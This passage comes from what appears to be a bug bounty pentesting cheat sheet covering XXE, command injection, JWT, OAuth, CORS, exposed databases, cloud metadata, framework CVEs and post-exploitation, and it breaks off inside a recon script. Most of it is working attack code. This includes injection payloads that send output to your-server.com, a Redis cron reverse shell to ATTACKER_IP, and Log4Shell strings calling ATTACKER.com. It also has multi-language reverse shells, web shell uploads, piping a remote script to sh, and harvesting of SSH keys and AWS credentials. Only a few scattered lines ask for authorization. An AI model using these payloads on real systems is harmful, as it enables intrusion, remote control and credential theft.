**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Basic XXE payload (in any XML input)
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# Blind XXE via OOB
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-server.com/xxe.dtd">
  %xxe;
]>

# SSRF via XXE
<!DOCTYPE foo [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&ssrf;</foo>
```

**Explanation:** XXE vulnerabilities exist in any XML parser that processes user-supplied XML. Look for: file upload accepting .docx/.xlsx/.svg/.xml, SOAP APIs, REST APIs that accept XML content-type, SVG processing. **Impact:** file read, SSRF, DoS (billion laughs attack). **Blind XXE** uses OOB technique — DTD on your server exfiltrates data via DNS/HTTP. Always try changing `Content-Type: application/json` to `application/xml`.

---

#### Command Injection
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Detection payloads
; id
| id
& id
&& id
|| id
`id`
$(id)

# Blind detection (time-based)
; sleep 10 #
| timeout 10
& ping -c 10 127.0.0.1

# OOB (out-of-band)
; curl http://your-server.com/$(whoami)
| wget http://your-server.com/$(id|base64)

# Bypass filters
;i\d
${IFS}id
'i'd
```

**Explanation:** Command injection in URL parameters, form fields, ping utilities, DNS lookup features, image conversion tools (ImageMagick), PDF generators. **Time-based detection** is key for blind injections — `sleep 10` causing 10-second delay confirms injection. `${IFS}` is the Internal Field Separator (space alternative). OOB confirms blind RCE. **Highest impact vulnerability class in bug bounty — often critical.**

---

## Phase 6: Authentication, Authorization & API Testing

> **Authentication, Authorization & API Testing** — JWT attacks, OAuth flows, IDOR, CORS, and GraphQL testing. Authentication flaws are the highest-paid bug class.

### JWT — JSON Web Token Attacks

#### jwt_tool — Audit JWT tokens
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
python3 jwt_tool.py YOUR.JWT.TOKEN -T  # Tamper mode
python3 jwt_tool.py YOUR.JWT.TOKEN -X a  # alg:none attack
python3 jwt_tool.py YOUR.JWT.TOKEN -C -d /usr/share/wordlists/rockyou.txt  # Crack secret
python3 jwt_tool.py YOUR.JWT.TOKEN -pk server.pub -X s  # RS256 → HS256 confusion
python3 jwt_tool.py -t https://TARGET/api/user -rh "Authorization: Bearer TOKEN" -M at
```

**Explanation:** **alg:none attack:** Change algorithm to "none" and remove signature — some servers accept it. **RS256→HS256:** Get server's RSA public key, use it as HMAC secret for HS256 — server verifies successfully. **Crack secret:** Weak secrets like "secret", "password" are common. `-M at` tests all attacks automatically.
**Install:** `git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt`

---

### OAuth 2.0 Testing

#### OAuth Misconfigs
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Test redirect_uri bypass
https://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&scope=read
https://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=https://TARGET.evil.com&scope=read
https://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback/../evil&scope=read

# Missing state parameter (CSRF)
https://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=LEGIT&scope=read
# No state = CSRF → account takeover

# Token in Referer
# 1. Authenticate and get code
# 2. Check if code leaks in Referer header to analytics
```

**Explanation:** **redirect_uri bypass:** Add extra characters after legit domain. **State parameter missing = CSRF:** Attacker crafts authorization URL, victim clicks → attacker's account linked to victim's. **Referrer leak:** Authorization code in URL → leaked to third-party analytics via Referer header → account takeover. OAuth bugs are regularly worth $5,000–$20,000 in bug bounties.

---

### IDOR — Insecure Direct Object Reference

#### IDOR Testing
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Burp Intruder — numeric ID enumeration
GET /api/users/§1001§/profile  → try 1000-1100
GET /api/orders/§ORDER_ID§      → change your order ID

# UUID-based IDOR (harder but common)
# Collect UUIDs from other endpoints, try them here

# IDOR in file download
GET /files/download?id=12345 → change to 12344, 12346

# IDOR in API
curl -H "Authorization: Bearer TOKEN_A" https://TARGET/api/user/USER_B_ID
curl -H "Authorization: Bearer TOKEN_A" https://TARGET/api/user/USER_B_ID/documents

# Parameter pollution
GET /api/transfer?from=ATTACKER_ACCT&to=TARGET&from=TARGET_ACCT
```

**Explanation:** **Most common high-severity bug in bug bounty.** Create two accounts (A and B). Authenticate as A. Access B's resources. Check: user profiles, orders, files, messages, invoices, any resource with an ID. **Horizontal IDOR:** same role, access other user's data. **Vertical IDOR:** access admin resources as regular user. **UUID IDOR:** collect UUIDs from API responses, use them across endpoints. Always check `id`, `user_id`, `account`, `invoice_id` params.

---

### CORS Misconfiguration

#### cors-scanner + manual
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Test CORS manually
curl -H "Origin: https://evil.com" -I https://TARGET/api/user
# Look for: Access-Control-Allow-Origin: https://evil.com
# And: Access-Control-Allow-Credentials: true

# Test null origin
curl -H "Origin: null" -I https://TARGET/api/user

# Test subdomain
curl -H "Origin: https://evil.TARGET" -I https://TARGET/api/user

# Automated
python3 corsy.py -u https://TARGET --headers "Cookie: session=TOKEN"
cors-scanner https://TARGET -H "Cookie: session=TOKEN"
```

**Explanation:** **The dangerous combination:** `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`. This lets evil.com make credentialed requests. Exploit: create a page on attacker domain that fetches `/api/user` with the victim's cookies → reads sensitive data. **Null origin test:** Some servers trust null origin (sandboxed iframes can be null).
**Install corsy:** `git clone https://github.com/s0md3v/Corsy`

---

### GraphQL Testing

#### GraphQL Introspection + Attacks
**Severity:** HIGH | **Type:** WEB

```bash
# Test if GraphQL endpoint exists
curl -s -X POST https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Full schema introspection
curl -s -X POST https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name}}}}}"}'

# Try to access admin queries (IDOR)
curl -X POST https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{users{id email password role}}"}'

# SQLi in GraphQL argument
curl -X POST https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{user(id: \"1 OR 1=1\"){ email }}"}''
```

**Explanation:** **Introspection enabled in production = schema exposure.** The __schema query dumps ALL types, queries, mutations, and their arguments. Look for: hidden admin queries, `deleteUser`, `getAllUsers`, `updateRole`. Test injection in query arguments. **Batching attacks:** GraphQL often allows sending arrays of queries → brute force rate limit bypass. **Tool:** Use InQL (Burp extension) or graphw00f for comprehensive testing.

---

## Phase 7: Database & Storage Attacks

> **Database & Storage Attacks** — Testing exposed or accessible database services. Misconfigured databases (Redis, MongoDB, Elasticsearch without auth) are critical findings.

### MySQL / MariaDB

#### MySQL External Access
**Severity:** CRITICAL | **Type:** DB

```bash
mysql -h TARGET -u root -p  # Try empty password, root, admin
mysql -h TARGET -u root
nmap --script mysql-info,mysql-databases,mysql-empty-password,mysql-users -p 3306 TARGET

# Check for empty root password
mysqladmin -h TARGET -u root status

# List databases
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;

# Dump all
mysqldump -h TARGET -u root -p --all-databases > dump_TARGET.sql
```

**Explanation:** MySQL exposed on port 3306 with empty root password is a critical finding. `mysql-empty-password` NSE script auto-detects. After access: `SHOW DATABASES` → `USE targetdb` → `SHOW TABLES` → `SELECT * FROM users`. **Common empty password credentials:** root:, root:root, root:password, admin:admin. **SQLmap** can also dump data via injection.

---

### Redis — In-Memory Database

#### Redis Unauthenticated Access
**Severity:** CRITICAL | **Type:** DB

```bash
redis-cli -h TARGET ping  # Should return PONG
redis-cli -h TARGET info
redis-cli -h TARGET keys '*'
redis-cli -h TARGET get KEYNAME

# Data dump
redis-cli -h TARGET --no-auth-warning -a "" dump

# RCE via cron job (if Redis running as root)
redis-cli -h TARGET config set dir /var/spool/cron
redis-cli -h TARGET config set dbfilename root
redis-cli -h TARGET set EVIL "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
redis-cli -h TARGET save

# SSH key injection
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET set KEY "$(cat ~/.ssh/id_rsa.pub)"
```

**Explanation:** Redis on port 6379 often has NO authentication. `redis-cli ping → PONG` confirms unauthenticated access. **RCE via cron:** If Redis runs as root, write a reverse shell cron job. **SSH key injection:** Write your public key to /root/.ssh/authorized_keys → passwordless SSH. **CRITICAL severity — instant full server compromise.**

---

### MongoDB

#### MongoDB Unauthenticated Access
**Severity:** CRITICAL | **Type:** DB

```bash
mongo TARGET:27017  # No auth
mongo --host TARGET --port 27017

# Check with mongosh
mongosh "mongodb://TARGET:27017"

# Commands after access
show dbs
use admin
db.system.users.find()
use <database>
show collections
db.<collection>.find().limit(100)

# Automated
nmap --script mongodb-info,mongodb-databases -p 27017 TARGET
nosqlmap -u "https://TARGET/api/users?id=1"
```

**Explanation:** MongoDB default install has no authentication. Common in development environments accidentally exposed to internet. After connecting: `show dbs` lists all databases. `db.users.find()` dumps user collection (emails + password hashes). **NoSQLMap:** automated NoSQL injection and exploitation tool — like SQLMap for MongoDB. Attack: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` bypasses auth.
**Install:** `apt install mongodb-clients`

---

### Elasticsearch / Solr

#### Elasticsearch Unauthenticated
**Severity:** CRITICAL | **Type:** DB

```bash
# Check if exposed
curl -s https://TARGET:9200/ | jq .
curl -s http://TARGET:9200/_cat/indices?v
curl -s http://TARGET:9200/_cat/nodes?v

# Dump index
curl -s http://TARGET:9200/INDEX_NAME/_search?size=100
curl -s http://TARGET:9200/_all/_search?q=password
curl -s http://TARGET:9200/_all/_search?q=email

# Check all indices
curl -s http://TARGET:9200/_cat/indices?h=index | while read idx; do
  echo "=== $idx ==="
  curl -s "http://TARGET:9200/${idx}/_search?size=1"
done
```

**Explanation:** Elasticsearch on port 9200 is frequently left open without authentication. `_cat/indices` lists all data indices. One HTTP GET request can dump millions of records. **Historical leaks:** Elasticsearch has been the source of many major data breaches (500M+ records exposed). Look for indices named: users, logs, emails, customers, credentials, passwords, tokens.

---

#### SolrCloud Attack
**Severity:** CRITICAL | **Type:** DB

```bash
# Solr admin UI check
curl http://TARGET:8983/solr/admin/info/system
curl http://TARGET:8983/solr/admin/cores

# DataImportHandler RCE (CVE-2019-0193)
curl "http://TARGET:8983/solr/CORE/dataimport?command=full-import&debug=true&verbose=true" \
  -H "Content-Type: application/json" \
  -d '{"dataConfig":"<dataConfig><dataSource type=\"URLDataSource\"/><document><entity name=\"x\" url=\"http://ATTACKER.com/rce\"/></document></dataConfig>"}'

# XXE via update (CVE-2017-12629)
nmap --script http-solr-log4shell -p 8983 TARGET
```

**Explanation:** Solr admin UI on 8983 should NOT be externally accessible. **DataImportHandler RCE:** Allows arbitrary URL fetching with XXE and RCE capabilities. **Log4Shell (CVE-2021-44228):** Solr was vulnerable. Always check for Solr admin UI exposure. If accessible externally, it's a critical finding regardless of RCE capability.

---

### PostgreSQL / MSSQL

#### PostgreSQL Testing
**Severity:** HIGH | **Type:** DB

```bash
psql -h TARGET -U postgres -W  # Default user: postgres
pg_isready -h TARGET -p 5432

# After connection
\list
\connect <database>
\dt
SELECT version();
SELECT current_user;
SELECT * FROM information_schema.tables;

# RCE via COPY (if superuser)
CREATE TABLE pwn(data text);
COPY pwn FROM PROGRAM 'id; whoami; cat /etc/passwd';
```

**Explanation:** PostgreSQL default user is `postgres` with no password or password `postgres`. `COPY FROM PROGRAM` executes OS commands if the user is a superuser — instant RCE. `pg_isready` checks if port is accepting connections. Also check for `LOAD` extension attacks (load malicious .so file). SQLMap supports PostgreSQL injection with `--dbms=postgresql`.

---

## Phase 8: Cloud Infrastructure Testing

> **Cloud Infrastructure Testing** — AWS, GCP, Azure metadata endpoints, S3 bucket enumeration, and cloud misconfiguration detection.

### AWS S3 Bucket Attacks

#### S3 Bucket Enumeration
**Severity:** CRITICAL | **Type:** CLOUD

```bash
# Find buckets by name
aws s3 ls s3://TARGET --no-sign-request
aws s3 ls s3://TARGET-assets --no-sign-request
aws s3 ls s3://TARGET-backup --no-sign-request
aws s3 ls s3://TARGET-dev --no-sign-request

# Enumerate with tools
python3 s3scanner.py --bucket-file buckets_TARGET.txt
bucket_finder.rb TARGET

# Download all files (if public read)
aws s3 sync s3://BUCKET_NAME /tmp/bucket_dump --no-sign-request

# Check write access
aws s3 cp /tmp/test.txt s3://BUCKET_NAME/test.txt --no-sign-request
```

**Explanation:** Public S3 buckets are a critical finding. Common bucket names: `company-assets`, `company-backup`, `company-dev`, `company-data`, `company-logs`. **Write access = defacement, malware distribution.** Download and grep for: passwords, API keys, private keys, PII. `--no-sign-request` tests without AWS credentials.
**Install:** `pip install awscli`

---

### AWS Metadata Service

#### IMDS — Instance Metadata Service
**Severity:** CRITICAL | **Type:** CLOUD

```bash
# Directly (if on EC2 instance or via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# After getting credentials — use them
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

**Explanation:** **SSRF → AWS Metadata = Critical.** Any SSRF on AWS-hosted application can access `169.254.169.254`. The IAM credentials endpoint returns temporary AWS keys. With those keys: list S3 buckets, describe EC2 instances, access Secrets Manager, escalate privileges. **IMDSv2** requires a PUT request first for a token — some SSRF bypasses work against IMDSv2 too. This is a regular $10,000–$50,000 finding.

---

#### AWS Credential & Secret Scanning
**Severity:** CRITICAL | **Type:** CLOUD

```bash
# Scan for AWS keys in git repos
gitleaks detect --source=. --report-format json --report-path leaks_TARGET.json
trufflehog git file://. --json

# Common locations to check
curl https://TARGET/.env
curl https://TARGET/.aws/credentials
curl https://TARGET/config.php
curl https://TARGET/config.js
curl https://TARGET/app/config/parameters.yml
curl https://TARGET/wp-config.php  # WordPress

# Verify if key is valid
aws sts get-caller-identity --profile leaked
```

**Explanation:** Look for AWS keys starting with `AKIA` (permanent) or `ASIA` (temporary). GitHub dorks: `site:github.com "AKIA" "TARGET"`. Check: `.env` files, `config.php`, JavaScript files, docker-compose.yml. **Always verify credentials responsibly** — use sts:GetCallerIdentity (read-only, leaves a CloudTrail log). Report immediately and never escalate privileges beyond what's needed to prove impact.

---

### Kubernetes & Container Security

#### Kubernetes API Exposure
**Severity:** CRITICAL | **Type:** CLOUD

```bash
# Check if K8s API is exposed
curl -k https://TARGET:6443/api/v1/namespaces
curl -k https://TARGET:8443/api/v1/namespaces
curl -k https://TARGET:443/api/v1/nodes

# Test anonymous access
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify get pods --all-namespaces

# Etcd (K8s data store — contains secrets)
curl http://TARGET:2379/v2/keys/?recursive=true
etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only

# K8s dashboard
curl http://TARGET:30000/api/v1/namespaces
nmap -sV -p 6443,8443,2379,2380,10250,10255 TARGET
```

**Explanation:** Kubernetes API server on 6443 without RBAC = full cluster access. **Etcd on 2379 unauthenticated = ALL K8s secrets exposed** (service account tokens, API keys, DB passwords). `kubelet on 10250` (read-only on 10255) — unauthenticated kubelet allows: reading pod logs, exec into containers, access to secrets. K8s misconfigurations have caused multiple billion-dollar cloud breaches.

---

## Phase 9: Framework & Technology-Specific Testing

> **Framework & Technology-Specific Testing** — Targeted attacks based on detected technology stack. Different frameworks have different default vulnerabilities and misconfigurations.

### PHP / HHVM / Hack

#### PHP Deserialization
**Severity:** CRITICAL | **Type:** WEB

```bash
# Test for deserialization in cookies/params
# Look for: base64-encoded PHP serialized objects
# O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"password";s:8:"12345678";}

# Generate gadget chains with phpggc
phpggc -l  # list all gadget chains
phpggc Monolog/RCE1 system 'id' | base64
phpggc Laravel/RCE1 system 'id' | base64
phpggc WordPress/RCE1 system 'id'

# If PHAR deserialization
# Upload PHAR file disguised as image, trigger via file:// wrapper
```

**Explanation:** PHP serialized objects look like: `O:8:"stdClass":1:{s:4:"name";s:5:"admin";}`. If found in cookies or POST data, test deserialization exploits. `phpggc` generates ready-to-use payload chains for Laravel, Symfony, WordPress, Magento, etc. **PHAR deserialization:** upload a PHAR file (with PHP payload), trigger deserialization via `phar://` stream wrapper.
**Install phpggc:** `git clone https://github.com/ambionics/phpggc`

---

#### PHP File Upload & LFI Chains
**Severity:** HIGH | **Type:** WEB

```bash
# File upload bypass
# Change MIME type: Content-Type: image/jpeg (for PHP file)
# Double extension: shell.php.jpg
# Null byte: shell.php%00.jpg (old PHP)
# PHP variants: .php3, .php4, .php5, .phtml, .phar

# Test with curl
curl -F "file=@shell.php;type=image/jpeg" https://TARGET/upload
curl -F "file=@shell.php5" https://TARGET/api/upload

# After upload: access the file
curl https://TARGET/uploads/shell.php?cmd=id

# LFI + upload chain
# 1. Upload PHP shell as image
# 2. Note upload path from response
# 3. Include via LFI: ?page=../uploads/shell.jpg
```

**Explanation:** **File upload bypass techniques:** Content-Type spoofing (server trusts it), double extension (.php.jpg if server takes first ext), PHP variants (.phtml, .php5 often not blacklisted), null byte injection (older PHP). **LFI chain:** if you have LFI AND file upload, combine them for RCE — upload PHP code as "image", include it via LFI. Check `.htaccess` upload to change handler. **Impact: critical — RCE.**

---

### Node.js / Express

#### Node.js Prototype Pollution
**Severity:** HIGH | **Type:** WEB

```bash
# Test for prototype pollution in JSON POST
curl -X POST https://TARGET/api/user \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -X POST https://TARGET/api/user \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# Test via query parameters
https://TARGET/api?__proto__[isAdmin]=true
https://TARGET/api?constructor[prototype][isAdmin]=true

# Check if pollution worked
GET /api/profile  # Should now have isAdmin: true
```

**Explanation:** Prototype pollution in Node.js pollutes `Object.prototype` — affects ALL objects in the application. Common in apps using `lodash < 4.17.11`, `merge`, `extend`, `deep-assign` libraries. Bypasses: JSON merge, URL query parsing, query-string libraries. **Impact:** privilege escalation (inject isAdmin=true), DoS, and in some cases RCE via property injection into shell spawn calls. **Test ALL JSON endpoints.**

---

### Java / Spring / Struts

#### Java Deserialization & Spring RCE
**Severity:** CRITICAL | **Type:** WEB

```bash
# Log4Shell (CVE-2021-44228) — highest profile Java CVE
# Inject in User-Agent, X-Forwarded-For, username, any logged field
User-Agent: ${jndi:ldap://ATTACKER.com/a}
X-Forwarded-For: ${jndi:ldap://ATTACKER.com/a}
username: ${jndi:${lower:l}${lower:d}a${lower:p}://ATTACKER.com/a}  # bypass

# Spring4Shell (CVE-2022-22965)
curl -X POST https://TARGET/path \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B"

# Struts2 RCE (CVE-2017-5638)
curl -H "Content-Type: %{(#_='multipart/form-data')...}" https://TARGET

# Java deserialization detection
ysotools serialization test payloads
detect-java-deserialization -u https://TARGET
```

**Explanation:** **Log4Shell:** JNDI injection in ANY field that gets logged. Use OAST server to detect blind. **Spring4Shell:** ClassLoader manipulation via Spring MVC data binding. **Java deserialization:** look for serialized objects in cookies/POST (starts with `rO0AB` in base64). **ysoserial** generates gadget chains. These CVEs are worth maximum bounty.

---

### Python / Django / Flask

#### Django & Flask Specific Attacks
**Severity:** HIGH | **Type:** WEB

```bash
# Test for DEBUG mode enabled
curl https://TARGET/NONEXISTENT_PATH
# If DEBUG=True: shows full stack trace with source code

# Jinja2 SSTI in Flask
# In any user-controlled rendered template field:
{{7*7}}
{{config.SECRET_KEY}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Django admin default creds
curl https://TARGET/admin/ -d "username=admin&password=admin"
curl https://TARGET/admin/ -d "username=admin&password=django"

# Django debug toolbar exposure
curl https://TARGET/__debug__/

# Secret key brute force (if you know how sessions are generated)
python3 django-secret-key-cracker.py --cookie SESSION_COOKIE
```

**Explanation:** **DEBUG=True** in production exposes source code, local variables, installed apps list, and database settings in error pages — critical info disclosure. **SSTI:** `{{config.SECRET_KEY}}` directly reads the Django secret key — allows forging session cookies and full account takeover. **Admin default creds:** admin/admin is shockingly common. `/__debug__/` is the Django debug toolbar endpoint — should never be public.

---

## Phase 10: Post-Exploitation & Privilege Escalation

> **Post-Exploitation & Privilege Escalation** — After gaining initial access, these techniques help establish persistence, escalate privileges, and document impact for the bug report. **Only perform these steps if explicitly authorized in the scope.**

### Linux Privilege Escalation

#### LinPEAS / LinEnum
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer to target:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_output.txt

# Manual checks
sudo -l                          # What can we run as sudo?
find / -perm -4000 2>/dev/null   # SUID binaries
find / -writable -type f 2>/dev/null | grep -v proc  # Writable files
crontab -l; cat /etc/crontab    # Scheduled tasks
env | grep -i pass              # Passwords in environment
cat /etc/passwd | grep -v nologin  # Users with shells
```

**Explanation:** `LinPEAS` checks 300+ potential escalation vectors in one script. **Key findings:** SUID binaries (run as root regardless of calling user), sudo misconfigs (wildcards, NOPASSWD), writable cron jobs (add reverse shell), PATH hijacking, weak file permissions on sensitive files. `sudo -l` is the first command to run — if you see `NOPASSWD: ALL` it's immediate root.

---

### Reverse Shells & Persistence

#### Reverse Shell Payloads
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Start listener
nc -lvnp 4444
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),i)for i in(0,1,2)];subprocess.run(["/bin/sh"])'

# PHP
php -r '$s=fsockopen("ATTACKER_IP",4444);proc_open("/bin/bash",[$s,$s,$s],$p);'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");'

# Upgrade to PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo; fg
```

**Explanation:** **For bug bounty:** Only use reverse shells if explicitly authorized to test post-exploitation. Upgrade with `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `stty raw -echo; fg` for full TTY. **Document impact:** Take screenshots of `id`, `hostname`, `ifconfig`, `cat /etc/passwd`. This is what justifies critical severity rating. Use **hacktools.netlify.app** for more payload generators.

---

### Credential & Secret Extraction

#### Credential Harvesting
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Environment variables
env | grep -iE "pass|key|secret|token|api|auth|cred"
printenv | grep -iE "AWS|DB|DATABASE|MYSQL|REDIS"

# Config files
find / -name "*.env" -o -name "config.php" -o -name "wp-config.php" -o -name "settings.py" 2>/dev/null
grep -r "password\|api_key\|secret_key\|access_token" /var/www/ /opt/ /home/ 2>/dev/null

# Bash history
cat ~/.bash_history
cat ~/.zsh_history
find /home -name ".bash_history" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa

# AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config
```

**Explanation:** **Environment variables** are the most common place for secrets in modern apps (12-factor app pattern). `grep -iE` case-insensitive regex. **Bash history** often contains passwords typed in command arguments (mysql -p PASSWORD, curl -u admin:password). **SSH keys** in home directories enable lateral movement. **AWS credentials** files give cloud access. These are all critical bug bounty findings — document each with screenshot.

---

## Phase 11: Vulnerability Type Reference

### XSS — Cross-Site Scripting
**Severity:** HIGH

Inject malicious scripts into pages viewed by other users. Can steal cookies, tokens, and perform actions on behalf of victim.

### SQLi — SQL Injection
**Severity:** CRITICAL

Inject SQL commands into database queries. Leads to data theft, authentication bypass, and sometimes RCE via xp_cmdshell or INTO OUTFILE.

### SSRF — Server-Side Request Forgery
**Severity:** CRITICAL

Make the server fetch arbitrary URLs. On cloud (AWS/GCP), accesses metadata endpoint to steal IAM credentials → full cloud takeover.

### IDOR — Insecure Direct Object Reference
**Severity:** HIGH

Access other users' resources by changing IDs in requests. Most common high-severity bug in modern web apps. Test every ID parameter.

### XXE — XML External Entity
**Severity:** HIGH

Inject XML entities to read local files or perform SSRF. Look for XML input, DOCX/XLSX uploads, SOAP APIs, and SVG processing.

### SSTI — Server-Side Template Injection
**Severity:** CRITICAL

Inject template expressions into template engines. Usually leads to RCE. Common in Jinja2 (Python), Twig (PHP), Pebble (Java), FreeMarker.

### LFI/RFI — Local/Remote File Inclusion
**Severity:** HIGH

Include local or remote files via path traversal. Can read /etc/passwd, source code, SSH keys. Chain with log poisoning for RCE.

### CORS — Cross-Origin Resource Sharing Misconfiguration
**Severity:** HIGH

Misconfigured CORS + Allow-Credentials allows attacker origin to make credentialed requests and read responses — account takeover.

### OAuth 2.0 Misconfiguration
**Severity:** CRITICAL

Improper redirect_uri validation, missing state parameter, or token in Referer leads to authorization code theft → account takeover.

### RCE — Remote Code Execution
**Severity:** CRITICAL

Execute arbitrary code on the server. Highest severity class. Achieved via deserialization, SSTI, command injection, file upload bypass, or known CVEs.

### Subdomain Takeover
**Severity:** HIGH

Claim a subdomain pointing to unclaimed service (Heroku, GitHub Pages, S3). Host malicious content under trusted domain → cookie theft.

### JWT Algorithm Confusion
**Severity:** CRITICAL

Switch from RS256 to HS256 using the public key as secret, set alg:none, or crack weak secrets to forge admin tokens.

---

## Phase 12: Automated Bash Script

```bash
#!/bin/bash
# ============================================================
# BB-TOOLKIT AUTO RECON SCRIPT
# Target(s): TARGET
# Generated: $(date)
# ============================================================

TARGETS=("TARGET")
PRIMARY="TARGET"
OUTPUT_DIR="./bb_recon_TARGET_$(date +%Y%m%d)"
THREADS=50
RATE=500
LOG="$OUTPUT_DIR/scan.log"

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
BLU='\033[0;34m'; CYN='\033[0;36m'; NC='\033[0m'

banner() {
  echo -e "\n${CYN}╔══════════════════════════════════════╗${NC}"
  echo -e "${CYN}║  BB-TOOLKIT AUTO RECON               ║${NC}"
  echo -e "${CYN}║  Target: $PRIMARY${NC}"
  echo -e "${CYN}╚══════════════════════════════════════╝${NC}\n"
}

step() { echo -e "\n${GRN}[+] $1${NC}" | tee -a "$LOG"; }
warn() { echo -e "${YEL}[!] $1${NC}" | tee -a "$LOG"; }
fail() { echo -e "${RED}[-] $1${NC}" | tee -a "$LOG"; }
info() { echo -e "${BLU}[*] $1${NC}" | tee -a "$LOG"; }

check_tools() {
  step "Checking required tools..."
  TOOLS=(subfinder amass assetfinder dnsx httpx nmap nuclei ffuf whatweb waybackurls gau curl jq)
  for tool in "${TOOLS[@]}"; do
    if command -v "$tool" &>/dev/null; then
      echo -e "  ${GRN}✓${NC} $tool"
    else
      echo -e "  ${RED}✗${NC} $tool — NOT INSTALLED"
    fi
  done
}

setup_dirs() {
  step "Setting up output directory: $OUTPUT_DIR"
  mkdir -p "$OUTPUT_DIR"/{subs,dns,web,vulns,screenshots,ports,js,endpoints}
  echo "Scan started: $(date)" > "$LOG"
}

phase1_subdomains() {
  step "PHASE 1: Subdomain Enumeration — $PRIMARY"

  for domain in "${TARGETS[@]}"; do
    info "Processing: $domain"

    if command -v subfinder &>/dev/null; then
      info "Running subfinder..."
      subfinder -d "$domain" -all -silent -o "$OUTPUT_DIR/subs/subfinder_$domain.txt" 2>/dev/null
    fi

    if command -v amass &>/dev/null; then
      info "Running amass (passive)..."
      amass enum -passive -d "$domain" -o "$OUTPUT_DIR/subs/amass_$domain.txt" 2>/dev/null &
    fi

    if command -v assetfinder &>/dev/null; then
      info "Running assetfinder..."
      assetfinder --subs-only "$domain" > "$OUTPUT_DIR/subs/assetfinder_$domain.txt" 2>/dev/null
    fi

    info "Querying crt.sh..."
    curl -s "https://crt.sh/?q=%25.$domain&output=json" 2>/dev/null | \
      jq -r '.[].name_value' 2>/dev/null | \
      sed 's/\*\.//g' | sort -u > "$OUTPUT_DIR/subs/crtsh_$domain.txt"
  done

  wait

  step "Merging subdomain results..."
  cat "$OUTPUT_DIR/subs/"*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/subs/all_subs.txt"
  TOTAL=$(wc -l < "$OUTPUT_DIR/subs/all_subs.txt")
  info "Total unique subdomains found: $TOTAL"
}

phase2_dns() {
  step "PHASE 2: DNS Resolution & HTTP Probing"

  if command -v dnsx &>/dev/null; then
    info "Resolving subdomains with dnsx..."
    dnsx -l "$OUTPUT_DIR/subs/all_subs.txt" -silent -o "$OUTPUT_DIR/dns/resolved.txt" 2>/dev/null
  fi

  if command -v httpx &>/dev/null; then
    info "HTTP probing with httpx..."
